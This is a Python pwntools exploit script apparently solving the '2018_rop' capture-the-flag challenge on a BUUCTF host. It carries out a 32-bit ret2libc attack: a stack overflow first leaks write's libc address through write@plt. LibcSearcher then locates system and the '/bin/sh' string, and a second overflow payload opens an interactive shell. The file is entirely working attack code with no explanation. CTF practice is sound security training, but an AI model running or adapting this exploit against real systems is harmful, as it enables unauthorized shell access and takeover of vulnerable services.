#!/usr/bin/python
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *

local = 0
os_level = 32
binary_name = '2018_rop'
remote_addr = 'node5.buuoj.cn'
port = 28725

if local:
    p = process('./' + binary_name)
    elf = ELF('./' + binary_name)
    # libc = e.libc
else:
    p = remote(remote_addr, port)
    elf = ELF('./' + binary_name)
    # libc = ELF(libc-2.23.so')

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
else:
    print('Error os!!!')
    exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda: p.recvline()
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sda = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
show = lambda x:log.success(x)
slp = lambda x:sleep(x)


#Main function
if __name__ == '__main__':
    #you can add your code here
    write_plt = elf.plt['write']
    write_got = elf.got['write']
    vuln_func = 0x08048474
    payload = b'a'*0x88 + b'b'*4 + p32(write_plt) + p32(vuln_func) + p32(1) + p32(write_got) + p32(4)
    sl(payload)
    write_addr = u32(rc(4))
    show('write_addr--> ' + hex(write_addr))
    libc = LibcSearcher('write', write_addr)
    libc_base = write_addr - libc.dump('write')
    system_addr = libc_base + libc.dump('system')
    bin_sh_addr = libc_base + libc.dump('str_bin_sh')
    show('libc_base--> ' + hex(libc_base))
    show('system_addr--> ' + hex(system_addr))
    show('bin_sh_addr--> ' + hex(bin_sh_addr))
    payload = b'a'*0x88 + b'b'*4 + p32(system_addr) + p32(0) + p32(bin_sh_addr)
    sl(payload)
    p.interactive()